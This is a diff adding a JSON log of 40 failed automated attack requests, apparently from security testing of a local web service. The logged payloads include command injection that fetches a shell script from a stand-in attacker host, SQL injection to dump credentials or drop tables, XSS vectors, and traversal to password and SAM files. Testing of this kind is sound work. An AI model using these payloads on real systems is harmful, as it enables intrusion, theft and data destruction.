@@ -1,0 +1,253 @@
+{
+  "target": "http://localhost:8082",
+  "timestamp": "2025-10-29T12:11:07.026740",
+  "results": [
+    {
+      "success": false,
+      "error": "HTTPConnectionPool(host='localhost', port=8082): Max retries exceeded with url: /api/search?q=%3B+wget+http%3A%2F%2Fevil.com%2Fshell.sh (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001C028567770>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))",
+      "attack_type": "CommandInjection",
+      "payload": "; wget http://evil.com/shell.sh"
+    },
+    {
+      "success": false,
+      "error": "HTTPConnectionPool(host='localhost', port=8082): Max retries exceeded with url: /api/login (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001C02A4BC560>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))",
+      "attack_type": "AuthBrute",
+      "payload": "admin"
+    },
+    {
+      "success": false,
+      "error": "HTTPConnectionPool(host='localhost', port=8082): Max retries exceeded with url: /api/search?q=....%5C....%5C....%5Cwindows%5Csystem.ini (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001C02A4BCD70>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))",
+      "attack_type": "Traversal",
+      "payload": "....\\....\\....\\windows\\system.ini"
+    },
+    {
+      "success": false,
+      "error": "HTTPConnectionPool(host='localhost', port=8082): Max retries exceeded with url: /api/search?q=%27+OR+1%3D1-- (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001C02A45F2C0>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))",
+      "attack_type": "SQLi",
+      "payload": "' OR 1=1--"
+    },
+    {
+      "success": false,
+      "error": "HTTPConnectionPool(host='localhost', port=8082): Max retries exceeded with url: /api/search?q=%60whoami%60 (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001C02A4BCEF0>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))",
+      "attack_type": "CommandInjection",
+      "payload": "`whoami`"
+    },
+    {
+      "success": false,
+      "error": "HTTPConnectionPool(host='localhost', port=8082): Max retries exceeded with url: /api/login (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001C02A4BD610>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))",
+      "attack_type": "AuthBrute",
+      "payload": "admin"
+    },
+    {
+      "success": false,
+      "error": "HTTPConnectionPool(host='localhost', port=8082): Max retries exceeded with url: /api/login (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001C02A4BDE20>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))",
+      "attack_type": "AuthBrute",
+      "payload": "admin"
+    },
+    {
+      "success": false,
+      "error": "HTTPConnectionPool(host='localhost', port=8082): Max retries exceeded with url: /api/search?q=..%25252f..%25252f..%25252fetc%25252fpasswd (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001C02A4BE630>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))",
+      "attack_type": "Traversal",
+      "payload": "..%252f..%252f..%252fetc%252fpasswd"
+    },
+    {
+      "success": false,
+      "error": "HTTPConnectionPool(host='localhost', port=8082): Max retries exceeded with url: /api/search?q=%24%28whoami%29 (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001C02A47BF20>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))",
+      "attack_type": "CommandInjection",
+      "payload": "$(whoami)"
+    },
+    {
+      "success": false,
+      "error": "HTTPConnectionPool(host='localhost', port=8082): Max retries exceeded with url: /api/search?q=1%27+UNION+SELECT+username%2C+password+FROM+users-- (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001C02A4BE570>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))",
+      "attack_type": "SQLi",
+      "payload": "1' UNION SELECT username, password FROM users--"
+    },
+    {
+      "success": false,
+      "error": "HTTPConnectionPool(host='localhost', port=8082): Max retries exceeded with url: /api/search?q=1%27+AND+1%3D1-- (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001C02A4BDA60>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))",
+      "attack_type": "SQLi",
+      "payload": "1' AND 1=1--"
+    },
+    {
+      "success": false,
+      "error": "HTTPConnectionPool(host='localhost', port=8082): Max retries exceeded with url: /api/search?q=%27%3B+DROP+TABLE+users-- (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001C02A4BD100>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))",
+      "attack_type": "SQLi",
+      "payload": "'; DROP TABLE users--"
+    },
+    {
+      "success": false,
+      "error": "HTTPConnectionPool(host='localhost', port=8082): Max retries exceeded with url: /api/login (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001C02A4BEFC0>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))",
+      "attack_type": "AuthBrute",
+      "payload": "admin"
+    },
+    {
+      "success": false,
+      "error": "HTTPConnectionPool(host='localhost', port=8082): Max retries exceeded with url: /api/search?q=javascript%3Aalert%28%27XSS%27%29 (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001C02A4BF950>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))",
+      "attack_type": "XSS",
+      "payload": "javascript:alert('XSS')"
+    },
+    {
+      "success": false,
+      "error": "HTTPConnectionPool(host='localhost', port=8082): Max retries exceeded with url: /api/search?q=%3Ciframe+src%3D%27javascript%3Aalert%281%29%27%3E (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001C02A47BCE0>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))",
+      "attack_type": "XSS",
+      "payload": "<iframe src='javascript:alert(1)'>"
+    },
+    {
+      "success": false,
+      "error": "HTTPConnectionPool(host='localhost', port=8082): Max retries exceeded with url: /api/search?q=%7C+curl+http%3A%2F%2Fattacker.com (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001C02A4BF3B0>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))",
+      "attack_type": "CommandInjection",
+      "payload": "| curl http://attacker.com"
+    },
+    {
+      "success": false,
+      "error": "HTTPConnectionPool(host='localhost', port=8082): Max retries exceeded with url: /api/search?q=..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001C02A4BC230>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))",
+      "attack_type": "Traversal",
+      "payload": "..\\..\\windows\\system32\\config\\sam"
+    },
+    {
+      "success": false,
+      "error": "HTTPConnectionPool(host='localhost', port=8082): Max retries exceeded with url: /api/search?q=%3Cselect+onfocus%3Dalert%28%27XSS%27%29+autofocus%3E (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001C02A4BD340>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))",
+      "attack_type": "XSS",
+      "payload": "<select onfocus=alert('XSS') autofocus>"
+    },
+    {
+      "success": false,
+      "error": "HTTPConnectionPool(host='localhost', port=8082): Max retries exceeded with url: /api/search?q=%27+OR+%271%27%3D%271%27+%2F%2A (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001C02A4BE2A0>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))",
+      "attack_type": "SQLi",
+      "payload": "' OR '1'='1' /*"
+    },
+    {
+      "success": false,
+      "error": "HTTPConnectionPool(host='localhost', port=8082): Max retries exceeded with url: /api/search?q=1%27+UNION+SELECT+NULL%2CNULL%2CNULL%2CNULL-- (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001C02A4BE8D0>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))",
+      "attack_type": "SQLi",
+      "payload": "1' UNION SELECT NULL,NULL,NULL,NULL--"
+    },
+    {
+      "success": false,
+      "error": "HTTPConnectionPool(host='localhost', port=8082): Max retries exceeded with url: /api/search?q=%3Ctextarea+onfocus%3Dalert%28%27XSS%27%29+autofocus%3E (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001C02A47BCE0>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))",
+      "attack_type": "XSS",
+      "payload": "<textarea onfocus=alert('XSS') autofocus>"
+    },
+    {
+      "success": false,
+      "error": "HTTPConnectionPool(host='localhost', port=8082): Max retries exceeded with url: /api/search?q=%27+OR+%271%27%3D%271 (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001C02A4BEC90>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))",
+      "attack_type": "SQLi",
+      "payload": "' OR '1'='1"
+    },
+    {
+      "success": false,
+      "error": "HTTPConnectionPool(host='localhost', port=8082): Max retries exceeded with url: /api/search?q=1%27+ORDER+BY+1-- (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001C02A4BDD00>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))",
+      "attack_type": "SQLi",
+      "payload": "1' ORDER BY 1--"
+    },
+    {
+      "success": false,
+      "error": "HTTPConnectionPool(host='localhost', port=8082): Max retries exceeded with url: /api/search?q=%252e%252e%252f%252e%252e%252fetc%252fpasswd (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001C02A4BCE60>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))",
+      "attack_type": "Traversal",
+      "payload": "%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+    },
+    {
+      "success": false,
+      "error": "HTTPConnectionPool(host='localhost', port=8082): Max retries exceeded with url: /api/search?q=%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL-- (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001C02A4BCEC0>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))",
+      "attack_type": "SQLi",
+      "payload": "' UNION ALL SELECT NULL,NULL,NULL--"
+    },
+    {
+      "success": false,
+      "error": "HTTPConnectionPool(host='localhost', port=8082): Max retries exceeded with url: /api/search?q=%7C+cat+%2Fetc%2Fpasswd (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001C02A4BF590>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))",
+      "attack_type": "CommandInjection",
+      "payload": "| cat /etc/passwd"
+    },
+    {
+      "success": false,
+      "error": "HTTPConnectionPool(host='localhost', port=8082): Max retries exceeded with url: /api/search?q=1%27+WAITFOR+DELAY+%270%3A0%3A5%27-- (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001C02A4BF230>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))",
+      "attack_type": "SQLi",
+      "payload": "1' WAITFOR DELAY '0:0:5'--"
+    },
+    {
+      "success": false,
+      "error": "HTTPConnectionPool(host='localhost', port=8082): Max retries exceeded with url: /api/search?q=1%27+AND+SLEEP%285%29-- (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001C02A4BCF50>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))",
+      "attack_type": "SQLi",
+      "payload": "1' AND SLEEP(5)--"
+    },
+    {
+      "success": false,
+      "error": "HTTPConnectionPool(host='localhost', port=8082): Max retries exceeded with url: /api/search?q=1%27+OR+%271%27%3D%271%27-- (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001C02A4BD400>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))",
+      "attack_type": "SQLi",
+      "payload": "1' OR '1'='1'--"
+    },
+    {
+      "success": false,
+      "error": "HTTPConnectionPool(host='localhost', port=8082): Max retries exceeded with url: /api/search?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001C02A4BDCA0>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))",
+      "attack_type": "XSS",
+      "payload": "<script>alert('XSS')</script>"
+    },
+    {
+      "success": false,
+      "error": "HTTPConnectionPool(host='localhost', port=8082): Max retries exceeded with url: /api/search?q=%3Csvg+onload%3Dalert%28%27XSS%27%29%3E (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001C02A4BE8D0>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))",
+      "attack_type": "XSS",
+      "payload": "<svg onload=alert('XSS')>"
+    },
+    {
+      "success": false,
+      "error": "HTTPConnectionPool(host='localhost', port=8082): Max retries exceeded with url: /api/search?q=..%2F..%2F..%2Fetc%2Fpasswd (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001C02A4BCCB0>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))",
+      "attack_type": "Traversal",
+      "payload": "../../../etc/passwd"
+    },
+    {
+      "success": false,
+      "error": "HTTPConnectionPool(host='localhost', port=8082): Max retries exceeded with url: /api/search?q=..%2F..%2Fetc%2Fpasswd (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001C028567770>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))",
+      "attack_type": "Traversal",
+      "payload": "../../etc/passwd"
+    },
+    {
+      "success": false,
+      "error": "HTTPConnectionPool(host='localhost', port=8082): Max retries exceeded with url: /api/search?q=%27+UNION+SELECT+table_name+FROM+information_schema.tables-- (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001C02A4BDD90>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))",
+      "attack_type": "SQLi",
+      "payload": "' UNION SELECT table_name FROM information_schema.tables--"
+    },
+    {
+      "success": false,
+      "error": "HTTPConnectionPool(host='localhost', port=8082): Max retries exceeded with url: /api/search?q=%3Ciframe+src%3Ddata%3Atext%2Fhtml%2C%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E%3E (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001C02A4BD760>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))",
+      "attack_type": "XSS",
+      "payload": "<iframe src=data:text/html,<script>alert('XSS')</script>>"
+    },
+    {
+      "success": false,
+      "error": "HTTPConnectionPool(host='localhost', port=8082): Max retries exceeded with url: /api/search?q=....%2F%2F....%2F%2Fetc%2Fpasswd (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001C02A4BD9D0>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))",
+      "attack_type": "Traversal",
+      "payload": "....//....//etc/passwd"
+    },
+    {
+      "success": false,
+      "error": "HTTPConnectionPool(host='localhost', port=8082): Max retries exceeded with url: /api/search?q=1%27+AND+1%3D2-- (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001C02A4BF260>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))",
+      "attack_type": "SQLi",
+      "payload": "1' AND 1=2--"
+    },
+    {
+      "success": false,
+      "error": "HTTPConnectionPool(host='localhost', port=8082): Max retries exceeded with url: /api/search?q=%3Cinput+onfocus%3Dalert%28%27XSS%27%29+autofocus%3E (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001C02A4BFBC0>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))",
+      "attack_type": "XSS",
+      "payload": "<input onfocus=alert('XSS') autofocus>"
+    },
+    {
+      "success": false,
+      "error": "HTTPConnectionPool(host='localhost', port=8082): Max retries exceeded with url: /api/search?q=..%2F%2F..%2F%2F..%2F%2Fetc%2F%2Fpasswd (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001C02A4CC890>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))",
+      "attack_type": "Traversal",
+      "payload": "..//..//..//etc//passwd"
+    },
+    {
+      "success": false,
+      "error": "HTTPConnectionPool(host='localhost', port=8082): Max retries exceeded with url: /api/search?q=1%27+ORDER+BY+10-- (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001C02A4BC560>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))",
+      "attack_type": "SQLi",
+      "payload": "1' ORDER BY 10--"
+    }
+  ],
+  "stats": {
+    "total": 40,
+    "successful": 0,
+    "success_rate": 0.0,
+    "avg_latency": 0,
+    "variability": 0
+  }
+}
